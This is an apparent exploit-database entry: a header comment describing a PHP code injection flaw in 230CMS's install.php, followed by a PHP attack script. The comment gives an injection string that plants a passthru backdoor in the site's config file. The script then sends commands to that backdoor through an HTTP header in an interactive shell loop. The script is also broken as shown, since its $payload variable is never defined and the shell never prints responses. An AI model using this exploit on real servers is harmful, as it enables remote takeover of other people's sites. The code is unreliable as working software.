
/*

  ,--^----------,--------,-----,-------^--,
  | |||||||||   `--------&#039;     |          O .. CWH Underground Hacking Team ..
  `+---------------------------^----------|
    `\_,-------, _________________________|
      / XXXXXX /`|     /
     / XXXXXX /  `\   /
    / XXXXXX /\______(
   / XXXXXX /         
  / XXXXXX /
 (________(           
  `------&#039;
 
 Exploit Title   : 230CMS Remote Code Execution Exploit
 Date            : 12 June 2013
 Exploit Author  : CWH Underground
 Site            : www.2600.in.th
 Vendor Homepage : http://230cms.blogspot.com/
 Software Link   : http://jaist.dl.sourceforge.net/project/cms230/230%20CMS%201.1.2012/230%20CMS%201.1.2012.zip
 Version         : 1.1.2012
 Tested on       : Window and Linux
 
 
#####################################################
VULNERABILITY: PHP Code Injection
#####################################################
 
/install.php (LINE: 135-161)

-----------------------------------------------------------------------------
function SaveSettings () {
global $_POST;

if(isset($_POST[&#039;save_settings&#039;]))
{

	echo &#039;The config file has been written ......<br />&#039;;
	$default_time = isset($_POST[&#039;default_time&#039;]) ? $_POST[&#039;default_time&#039;] : &#039;UTC&#039;;
	$db_host = isset($_POST[&#039;db_host&#039;]) ? $_POST[&#039;db_host&#039;] : &#039;localhost&#039;;
	$db_name = isset($_POST[&#039;db_name&#039;]) ? $_POST[&#039;db_name&#039;] : &#039;&#039;;
	$db_user = isset($_POST[&#039;db_user&#039;]) ? $_POST[&#039;db_user&#039;] : &#039;root&#039;;
	$db_password = isset($_POST[&#039;db_password&#039;]) ? $_POST[&#039;db_password&#039;] : &#039;&#039;;
	$ad_name = isset($_POST[&#039;ad_name&#039;]) ? $_POST[&#039;ad_name&#039;] : &#039;&#039;;
	$ad_username = isset($_POST[&#039;ad_username&#039;]) ? $_POST[&#039;ad_username&#039;] : &#039;admin&#039;;
	$ad_email = isset($_POST[&#039;ad_email&#039;]) ? $_POST[&#039;ad_email&#039;] : &#039;&#039;;
	$domain = isset($_POST[&#039;domain&#039;]) ? $_POST[&#039;domain&#039;] : &#039;&#039;;
	$sitename = isset($_POST[&#039;sitename&#039;]) ? $_POST[&#039;sitename&#039;] : &#039;230 CMS&#039;;
	$tagline = isset($_POST[&#039;tagline&#039;]) ? $_POST[&#039;tagline&#039;] : &#039;A different CMS&#039;;
	$home_articles = isset($_POST[&#039;home_articles&#039;]) ? $_POST[&#039;home_articles&#039;] : &#039;5&#039;;
	$twitter = isset($_POST[&#039;twitter&#039;]) ? $_POST[&#039;twitter&#039;] : &#039;http://twitter.com/username&#039;;
	$facebook = isset($_POST[&#039;facebook&#039;]) ? $_POST[&#039;facebook&#039;] : &#039;http://www.facebook.com&#039;;
	$linkedin = isset($_POST[&#039;linkedin&#039;]) ? $_POST[&#039;linkedin&#039;] : &#039;http://www.linkedin.com&#039;;
	$youtube = isset($_POST[&#039;youtube&#039;]) ? $_POST[&#039;youtube&#039;] : &#039;http://www.youtube.com&#039;;
	$flickr = isset($_POST[&#039;flickr&#039;]) ? $_POST[&#039;flickr&#039;] : &#039;http://www.flickr.com&#039;;
	
	$fh = fopen("include/settings/base.php", &#039;w+&#039;) or die("Could not create the config file. Please check the file permissions to the cms installation folder.");
-----------------------------------------------------------------------------
 
LINE: 162-216
Write content to /include/settings/base.php

#####################################################
DESCRIPTION
#####################################################
 
An attacker might write to arbitrary files or inject arbitrary code into a file with this vulnerability.
User tainted data is used when creating the file name that will be opened or when creating the string that will be written to the file.
An attacker can try to write arbitrary PHP code in a PHP file allowing to fully compromise the server.

Attacker could access installation page (install.php) and enters the following code: &#039;);passthru(base64_decode($_SERVER[HTTP_CMD]));//

#####################################################
EXPLOIT
#####################################################
 
*/
  
error_reporting(0);
set_time_limit(0);
ini_set("default_socket_timeout", 5);

function http_send($host, $packet)
{
    if (!($sock = fsockopen($host, 80)))
        die("\n[-] No response from {$host}:80\n");
 
    fputs($sock, $packet);
    return stream_get_contents($sock);
}

print "\n+------------------------------------+";
print "\n| 230CMS PHP Code Injection Exploit |";
print "\n+------------------------------------+\n";
 
if ($argc < 3)
{
    print "\nUsage......: php $argv[0] <host> <path>\n";
    print "\nExample....: php $argv[0] localhost /";
    print "\nExample....: php $argv[0] localhost /230cms\n";
    die();
}

$host = $argv[1];
$path = $argv[2];


$packet  = "POST {$path}/install.php HTTP/1.0\r\n";
$packet .= "Host: {$host}\r\n";
$packet .= "Referer: {$host}{$path}/install.php?install=Next\r\n";
$packet .= "Connection: close\r\n";
$packet .= "Content-Type: application/x-www-form-urlencoded\r\n";
$packet .= "Content-Length: ".strlen($payload)."\r\n\r\n{$payload}";

$packet .= $payload;
    
http_send($host, $packet);

$packet  = "GET /{$path}/index.php HTTP/1.0\r\n";
$packet .= "Host: {$host}\r\n";
$packet .= "Cmd: %s\r\n";
$packet .= "Connection: close\r\n\r\n";
    
while(1)
{
    print "\n230cms-shell# ";
    if (($cmd = trim(fgets(STDIN))) == "exit") break;
    $response = http_send($host, sprintf($packet, base64_encode($cmd)));
}
     


 
################################################################################################################
# Greetz      : ZeQ3uL, JabAv0C, p3lo, Sh0ck, BAD $ectors, Snapter, Conan, Win7dos, Gdiupo, GnuKDE, JK, Retool2
################################################################################################################
?>

